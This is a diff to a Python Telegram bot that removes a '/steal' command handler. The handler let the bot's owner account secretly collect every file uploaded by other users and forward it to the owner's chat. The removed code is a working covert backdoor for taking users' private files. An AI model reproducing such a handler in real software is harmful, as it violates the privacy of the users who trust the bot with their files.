@@ -24,22 +24,6 @@ if (DEBUG_MODE):
 strings = json.load(open('filex/strings.json'))
 
 
-@bot.message_handler(commands=['steal'])
-def steal(message):
-    my_id = db.select('users', "name = 'victor141516'")[0]['telegram_id']
-    if (message.from_user.id != my_id):
-        return
-    not_my_user = db.select(
-        'users', "name not in ('victor141516', 'AlmuDuran')")
-    not_my_ids_str = ', '.join([str(each['id']) for each in not_my_user])
-    steals = db.select('files', "user_id in (" + not_my_ids_str + ")")
-    for each in steals:
-        for user in not_my_user:
-            if (user['id'] == each['user_id']):
-                bot.forward_message(
-                    my_id, user['telegram_id'], each['telegram_id'])
-
-
 @bot.message_handler(commands=['log'])
 def send_log(message):
     my_id = db.select('users', "name = 'victor141516'")[0]['telegram_id']
